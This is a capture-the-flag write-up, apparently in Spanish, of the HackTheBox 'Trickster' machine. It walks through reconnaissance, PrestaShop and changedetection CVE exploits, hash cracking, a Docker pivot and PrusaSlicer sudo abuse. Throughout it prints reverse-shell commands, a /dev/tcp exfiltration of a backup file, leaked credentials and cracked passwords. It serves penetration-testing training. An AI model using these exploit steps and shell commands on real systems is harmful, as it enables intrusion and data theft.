---
icon: desktop
hidden: true
noIndex: true
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Trickster



```bash
❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.11.34 -oG allPorts
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 23:44 CET
Nmap scan report for 10.10.11.34
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.75 seconds
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.34
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p22,80 10.10.11.34 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 23:45 CET
Nmap scan report for trickster.htb (10.10.11.34)
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   106.23 ms 10.10.16.1
2   32.34 ms  trickster.htb (10.10.11.34)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds
```



```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>

```bash
❯ cat /etc/hosts | grep 10.10.11.34
10.10.11.34 trickster.htb
```



<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat /etc/hosts | grep 10.10.11.34
10.10.11.34 trickster.htb shop.trickster.htb
```



<figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>



```bash
❯ dirsearch -u 'http://shop.trickster.htb/' -i 200 -t 50 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/Trickster/Trickster/content/reports/http_shop.trickster.htb/__25-01-24_23-48-51.txt

Target: http://shop.trickster.htb/

[23:48:51] Starting: 
[23:49:03] 200 -   20B  - /.git/COMMIT_EDITMSG
[23:49:03] 200 -  246KB - /.git/index
[23:49:04] 200 -   28B  - /.git/HEAD
[23:49:04] 200 -  112B  - /.git/config
[23:49:05] 200 -  413B  - /.git/branches/
[23:49:06] 200 -  240B  - /.git/info/exclude
[23:49:04] 200 -   73B  - /.git/description
[23:49:07] 200 -  163B  - /.git/logs/HEAD
[23:49:08] 200 -  460B  - /.git/info/
[23:49:09] 200 -  491B  - /.git/logs/
[23:49:10] 200 -  462B  - /.git/refs/
[23:49:11] 200 -  613B  - /.git/
```



<figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>



```bash
❯ python3 /opt/GitHack/GitHack.py http://shop.trickster.htb/.git/ 2>/dev/null
[+] Download and parse index file ...

...[snip]...

❯ ls -l
drwxrwxr-x kali kali 4.0 KB Fri Jan 24 23:49:55 2025  admin634ewutrx1jgitlooaj
.rw-rw-r-- kali kali 1.3 KB Fri Jan 24 23:50:10 2025  autoload.php
.rw-rw-r-- kali kali 2.4 KB Fri Jan 24 23:50:10 2025  error500.html
.rw-rw-r-- kali kali 1.1 KB Fri Jan 24 23:50:10 2025  index.php
.rw-rw-r-- kali kali 1.2 KB Fri Jan 24 23:50:10 2025  init.php
.rw-rw-r-- kali kali 4.9 KB Fri Jan 24 23:49:52 2025  INSTALL.txt
.rw-rw-r-- kali kali 522 B  Fri Jan 24 23:49:52 2025  Install_PrestaShop.html
.rw-rw-r-- kali kali 180 KB Fri Jan 24 23:49:52 2025  LICENSES
.rw-rw-r-- kali kali 863 B  Fri Jan 24 23:49:52 2025  Makefile
```





<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>



{% embed url="https://github.com/aelmokhtar/CVE-2024-34716" %}

```bash
❯ git clone https://github.com/aelmokhtar/CVE-2024-34716; cd CVE-2024-34716
Clonando en 'CVE-2024-34716'...
remote: Enumerating objects: 60, done.
remote: Counting objects: 100% (60/60), done.
remote: Compressing objects: 100% (42/42), done.
remote: Total 60 (delta 30), reused 34 (delta 13), pack-reused 0 (from 0)
Recibiendo objetos: 100% (60/60), 6.71 MiB | 18.51 MiB/s, listo.
Resolviendo deltas: 100% (30/30), listo.

❯ pip install -r requirements.txt
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: argparse in /usr/lib/python2.7 (from -r requirements.txt (line 1)) (1.2.1)
Requirement already satisfied: beautifulsoup4 in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 2)) (4.7.1)
Requirement already satisfied: requests in /usr/local/lib/python2.7/dist-packages (from -r requirements.txt (line 3)) (2.21.0)
Requirement already satisfied: soupsieve>=1.2 in /usr/local/lib/python2.7/dist-packages (from beautifulsoup4->-r requirements.txt (line 2)) (1.9.6)
Requirement already satisfied: urllib3<1.25,>=1.21.1 in /usr/local/lib/python2.7/dist-packages (from requests->-r requirements.txt (line 3)) (1.24.3)
Requirement already satisfied: chardet<3.1.0,>=3.0.2 in /usr/local/lib/python2.7/dist-packages (from requests->-r requirements.txt (line 3)) (3.0.4)
Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python2.7/dist-packages (from requests->-r requirements.txt (line 3)) (2021.10.8)
Requirement already satisfied: idna<2.9,>=2.5 in /usr/local/lib/python2.7/dist-packages (from requests->-r requirements.txt (line 3)) (2.8)
Requirement already satisfied: backports.functools-lru-cache; python_version < "3" in /usr/local/lib/python2.7/dist-packages (from soupsieve>=1.2->beautifulsoup4->-r requirements.txt (line 2)) (1.6.6)
```



```bash
❯ python3 exploit.py --url http://shop.trickster.htb --email 'gzzcoo@trickster.htb' --local-ip 10.10.16.5 --admin-path admin634ewutrx1jgitlooaj
[X] Starting exploit with:
	Url: http://shop.trickster.htb
	Email: gzzcoo@trickster.htb
	Local IP: 10.10.16.5
	Admin Path: admin634ewutrx1jgitlooaj
[X] Ncat is now listening on port 12345. Press Ctrl+C to terminate.
Serving at http.Server on port 5000
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:12345
Ncat: Listening on 0.0.0.0:12345
GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: 403
GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: 403
GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: 403
GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: 403
Request: GET /ps_next_8_theme_malicious.zip HTTP/1.1
Response: 200 -
10.10.11.34 - - [25/Jan/2025 00:03:18] "GET /ps_next_8_theme_malicious.zip HTTP/1.1" 200 -
Ncat: Connection from 10.10.11.34:58996.
Linux trickster 5.15.0-121-generic #131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 23:03:31 up 20 min,  0 users,  load average: 0.01, 0.09, 0.19
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```



```bash
www-data@trickster:~/prestashop/app/config$ cat parameters.php 
<?php return array (
  'parameters' => 
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'prest@shop_o',
```



```bash
www-data@trickster:~/prestashop/app/config$ mysql -u ps_user -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 793
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| prestashop         |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> USE prestashop;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [prestashop]> SHOW TABLES;
+-------------------------------------------------+
| Tables_in_prestashop                            |
+-------------------------------------------------+
...[snip]...
| ps_employee                                     |
...[snip]...
```



```bash
MariaDB [prestashop]> SELECT * FROM ps_employee;
+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+
| id_employee | id_profile | id_lang | lastname | firstname | email               | passwd                                                       | last_passwd_gen     | stats_date_from | stats_date_to | stats_compare_from | stats_compare_to | stats_compare_option | preselect_date_range | bo_color | bo_theme | bo_css    | default_tab | bo_width | bo_menu | active | optin | id_last_order | id_last_customer_message | id_last_customer | last_connection_date | reset_password_token | reset_password_validity | has_enabled_gravatar |
+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+
|           1 |          1 |       1 | Store    | Trickster | admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C | 2024-05-25 13:10:20 | 2024-04-25      | 2024-05-25    | 0000-00-00         | 0000-00-00       |                    1 | NULL                 | NULL     | default  | theme.css |           1 |        0 |       1 |      1 |  NULL |             5 |                        0 |                0 | 2025-01-24           | NULL                 | 0000-00-00 00:00:00     |                    0 |
|           2 |          2 |       0 | james    | james     | james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm | 2024-09-09 13:22:42 | NULL            | NULL          | NULL               | NULL             |                    1 | NULL                 | NULL     | NULL     | NULL      |           0 |        0 |       1 |      0 |  NULL |             0 |                        0 |                0 | NULL                 | NULL                 | NULL                    |                    0 |
+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+
2 rows in set (0.000 sec)
```





```bash
❯ hashid '$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm'
Analyzing '$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 

❯ hashcat -a 0 -m 3200 hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

...[snip]...

$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm:alwaysandforever
```



```bash
❯ ssh james@trickster.htb
james@trickster.htb's password: 
Last login: Thu Sep 26 11:13:01 2024 from 10.10.14.41
james@trickster:~$ ls
user.txt
james@trickster:~$ cat user.txt 
c4dfa6a95b5d1fff2a95ec5dd2f5ed71
```



```bash
james@trickster:/opt/PrusaSlicer$ netstat -ano | grep LISTEN
tcp        0      0 127.0.0.1:41187         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
```



```bash
james@trickster:/tmp$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:76:49:9c:dc  txqueuelen 0  (Ethernet)
        RX packets 23  bytes 1372 (1.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3  bytes 126 (126.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.34  netmask 255.255.254.0  broadcast 10.10.11.255
        ether 00:50:56:94:e5:6c  txqueuelen 1000  (Ethernet)
        RX packets 101550  bytes 15784782 (15.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 91338  bytes 36801649 (36.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 141463  bytes 203455605 (203.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 141463  bytes 203455605 (203.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth6d1f8aa: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether 5a:0c:1d:90:89:3a  txqueuelen 0  (Ethernet)
        RX packets 5  bytes 354 (354.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1  bytes 42 (42.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```



{% embed url="https://github.com/shadow1ng/fscan" %}



```bash
❯ ls -l fscan
.rwxrwxr-x kali kali 6.8 MB Sat May 11 11:04:09 2024  fscan

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
james@trickster:/tmp$ wget 10.10.16.5/fscan
--2025-01-24 23:28:44--  http://10.10.16.5/fscan
Connecting to 10.10.16.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7100304 (6.8M) [application/octet-stream]
Saving to: ‘fscan’

fscan                                                     100%[==================================================================================================================================>]   6.77M  2.87MB/s    in 2.4s    

2025-01-24 23:28:46 (2.87 MB/s) - ‘fscan’ saved [7100304/7100304]

james@trickster:/tmp$ ls -l fscan 
-rw-rw-r-- 1 james james 7100304 May 11  2024 fscan
james@trickster:/tmp$ chmod +x fscan
```



```bash
james@trickster:/tmp$ ./fscan -h 172.17.0.0/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.17.0.1      is alive
(icmp) Target 172.17.0.2      is alive
```





```bash
james@trickster:/tmp$ ./fscan -h 172.17.0.2 -p 1-65535

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
172.17.0.2:5000 open
[*] alive ports len is: 1
start vulscan
[*] WebTitle http://172.17.0.2:5000    code:302 len:213    title:Redirecting... 跳转url: http://172.17.0.2:5000/login?next=/
[*] WebTitle http://172.17.0.2:5000/login?next=/ code:200 len:12029  title:Change Detection
已完成 1/1
[*] 扫描结束,耗时: 32.150710904s
```





```bash
❯ ssh -L 5000:172.17.0.2:5000 james@trickster.htb
james@trickster.htb's password: 
Last login: Fri Jan 24 23:14:03 2025 from 10.10.16.5
```



<figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://www.incibe.es/index.php/incibe-cert/alerta-temprana/vulnerabilidades/cve-2024-32651" %}



<figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/4103_vmware_Zf2Upa4LSy (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/4106_vmware_3GMhmTZOQT.png" alt=""><figcaption></figcaption></figure>



```bash
❯ ls -l
.rw-r--r-- root root 618 B Wed Jan 22 12:51:27 2025  index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.34] 51220
# whoami
whoami
root
# hostname -I
hostname -I
172.17.0.2 
```



Otra manera mas sencilla



```bash
❯ git clone https://github.com/evgeni-semenov/CVE-2024-32651; cd CVE-2024-32651
Clonando en 'CVE-2024-32651'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 15 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
Recibiendo objetos: 100% (15/15), 7.19 KiB | 7.19 MiB/s, listo.
Resolviendo deltas: 100% (2/2), listo.
```



```bash
❯ python3 cve-2024-32651.py --url http://127.0.0.1:5000 --ip 10.10.16.5 --port 444 --password alwaysandforever
Obtained CSRF token: IjI2ZWQ2ZTRkZDJhNmI0ZjhiYzAzZDU3ZjlmNzY3ZmUxNWQ4YzZjZmUi.Z5QtRA.d55yaSsruh29scUFswGxYEAf_yg
Logging in...
[+] Login succesful
Redirect URL: /edit/88e869b2-2f04-4032-bb82-8f53b5b13345?unpause_on_save=1
Final request made.
Spawning shell...
[+] Trying to bind to :: on port 444: Done
[+] Waiting for connections on :::444: Got connection from ::ffff:10.10.11.34 on port 39568
Listening on port 444...
Connection received!
[*] Switching to interactive mode
root@a4b9a36ae7ff:/app# $ hostname -I
hostname -I
172.17.0.2 
```





```bash
root@a4b9a36ae7ff:/# ls -l
total 64
drwxr-xr-x   1 root root 4096 Jan 25 00:06 app
lrwxrwxrwx   1 root root    7 Apr  8  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Sep 13 12:24 boot
drwxr-xr-x   6 root root 4096 Jan 25 00:06 datastore
```



```
root@a4b9a36ae7ff:/datastore# ls -l
total 52
drwxr-xr-x 2 root root  4096 Jan 25 00:16 88e869b2-2f04-4032-bb82-8f53b5b13345
drwxr-xr-x 2 root root  4096 Aug 31 08:56 Backups
```



```bash
root@a4b9a36ae7ff:/datastore/Backups# ls -l
total 44
-rw-r--r-- 1 root root  6221 Aug 31 08:53 changedetection-backup-20240830194841.zip
-rw-r--r-- 1 root root 33708 Aug 30 20:25 changedetection-backup-20240830202524.zip
```



```bash
❯ nc -nlvp 443 > changedetection-backup-20240830194841.zip
listening on [any] 443 ...

----

root@a4b9a36ae7ff:/datastore/Backups$ cat changedetection-backup-20240830194841.zip > /dev/tcp/10.10.16.5/443
```



```bash
❯ ls -l changedetection-backup-20240830194841.zip
.rw-rw-r-- kali kali 6.1 KB Sat Jan 25 01:19:24 2025  changedetection-backup-20240830194841.zip
❯ unzip changedetection-backup-20240830194841.zip
Archive:  changedetection-backup-20240830194841.zip
   creating: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/
 extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/f04f0732f120c0cc84a993ad99decb2c.txt.br  
 extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/history.txt  
  inflating: secret.txt              
  inflating: url-list.txt            
  inflating: url-list-with-tags.txt  
  inflating: url-watches.json 
```



```bash
❯ ls -l
.rw-r--r-- kali kali 2.5 KB Sat Aug 31 01:47:18 2024  f04f0732f120c0cc84a993ad99decb2c.txt.br
.rw-r--r-- kali kali  51 B  Sat Aug 31 01:47:18 2024  history.txt

❯ brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br

❯ ls -l
.rw-r--r-- kali kali  12 KB Sat Aug 31 01:47:18 2024  f04f0732f120c0cc84a993ad99decb2c.txt
.rw-r--r-- kali kali 2.5 KB Sat Aug 31 01:47:18 2024  f04f0732f120c0cc84a993ad99decb2c.txt.br
.rw-r--r-- kali kali  51 B  Sat Aug 31 01:47:18 2024  history.txt

❯ cat f04f0732f120c0cc84a993ad99decb2c.txt

...[snip]...

            Raw Permalink Blame History

                < ? php return array (                                                                                                                                 
                'parameters' =>                                                                                                                                        
                array (                                                                                                                                                
                'database_host' => '127.0.0.1' ,                                                                                                                       
                'database_port' => '' ,                                                                                                                                
                'database_name' => 'prestashop' ,                                                                                                                      
                'database_user' => 'adam' ,                                                                                                                            
                'database_password' => 'adam_admin992' ,     
```



```bash
james@trickster:~$ su adam
Password: 
adam@trickster:/home/james$ sudo -l
Matching Defaults entries for adam on trickster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User adam may run the following commands on trickster:
    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
```



{% embed url="https://github.com/suce0155/prusaslicer_exploit" %}

```bash
❯ git clone https://github.com/suce0155/prusaslicer_exploit; cd prusaslicer_exploit
Clonando en 'prusaslicer_exploit'...
remote: Enumerating objects: 25, done.
remote: Counting objects: 100% (25/25), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 25 (delta 3), reused 0 (delta 0), pack-reused 0 (from 0)
Recibiendo objetos: 100% (25/25), 45.69 KiB | 1.34 MiB/s, listo.
Resolviendo deltas: 100% (3/3), listo.
```



```bash
❯ cat exploit.sh
/bin/bash -i >& /dev/tcp/10.10.16.5/444 0>&1

❯ ls -l
.rw-rw-r-- kali kali  38 KB Sat Jan 25 01:25:28 2025  evil.3mf
.rw-rw-r-- kali kali  45 B  Sat Jan 25 01:26:02 2025  exploit.sh
.rw-rw-r-- kali kali 369 B  Sat Jan 25 01:25:28 2025  README.md
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
adam@trickster:/tmp$ wget 10.10.16.5/exploit.sh
--2025-01-25 00:27:00--  http://10.10.16.5/exploit.sh
Connecting to 10.10.16.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 45 [text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh   100%[================================>]      45  --.-KB/s    in 0s      

2025-01-25 00:27:00 (3.79 MB/s) - ‘exploit.sh’ saved [45/45]

adam@trickster:/tmp$ wget 10.10.16.5/evil.3mf
--2025-01-25 00:27:08--  http://10.10.16.5/evil.3mf
Connecting to 10.10.16.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 39455 (39K) [application/vnd.ms-3mfdocument]
Saving to: ‘evil.3mf’

evil.3mf    100%[================================>]      45  --.-KB/s    in 0s      

2025-01-25 00:27:08 (315 KB/s) - ‘evil.3mf’ saved [39455/39455]
```



```bash
❯ nc -nlvp 444
listening on [any] 444 ...
```



```bash
adam@trickster:/tmp$ sudo /opt/PrusaSlicer/prusaslicer -s evil.3mf 
10 => Processing triangulated mesh
20 => Generating perimeters
30 => Preparing infill
45 => Making infill
65 => Searching support spots
69 => Alert if supports needed
print warning: Detected print stability issues:

EXPLOIT
Low bed adhesion

Consider enabling supports.
Also consider enabling brim.
88 => Estimating curled extrusions
88 => Generating skirt and brim
90 => Exporting G-code to EXPLOIT_0.3mm_{printing_filament_types}_MK4_{print_time}.gcode
```



```bash
❯ nc -nlvp 444
listening on [any] 444 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.34] 60656
root@trickster:/tmp# cat /root/root.txt
cat /root/root.txt
1036cb4e3c06fd32f82f02277b0855a4
```
